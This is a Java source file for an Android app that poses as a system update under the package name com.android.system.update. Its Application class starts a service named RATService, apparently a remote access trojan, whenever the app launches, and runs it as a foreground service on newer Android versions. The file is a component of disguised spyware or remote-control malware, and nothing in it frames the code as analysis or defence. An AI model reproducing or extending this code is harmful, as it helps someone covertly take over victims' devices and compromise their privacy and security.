package com.android.system.update;

import android.app.Application;
import android.content.Intent;
import android.os.Build;

public class AppController extends Application {
    private static RATService connectionService;
    private static AppController instance;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        
        // Start service on app creation
        startRATService();
    }

    public static synchronized RATService getConnectionService() {
        return connectionService;
    }

    public static synchronized void setConnectionService(RATService service) {
        connectionService = service;
    }

    public static synchronized void clearConnectionService() {
        connectionService = null;
    }

    public static AppController getInstance() {
        return instance;
    }
    
    private void startRATService() {
        Intent serviceIntent = new Intent(this, RATService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }
}
